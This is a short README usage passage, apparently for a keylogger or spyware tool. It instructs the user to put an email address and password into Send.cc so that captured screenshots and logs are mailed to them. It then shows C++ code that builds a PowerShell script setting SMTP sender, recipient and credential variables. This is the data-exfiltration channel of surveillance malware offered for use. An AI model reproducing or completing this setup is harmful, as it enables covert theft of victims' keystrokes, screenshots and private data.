# USAGE
Edit `Send.cc` file by inserting your email and its password, where screenshots and logs will be sent.

    _powershell = "$EmailFrom = \"<sender's email>\"\n";
    _powershell += "$EmailTo = \"<recipient's email>\"\n";
    _powershell += "$EmailSubject = \"<your subject>\"\n";
    _powershell += "$EmailBody = \"<your body>\"\n";
    _powershell += "$SMTPserver = \"<SMTP Server>\"\n";
    _powershell += "$username = \"<sender's email>\"\n";
    _powershell += "$password = \"<sender's email password>\" | ConvertTo-SecureString -AsPlainText -Force\n";
    _powershell += "$credential = New-Object System.Management.Automation.PSCredential($username, $password)\n";
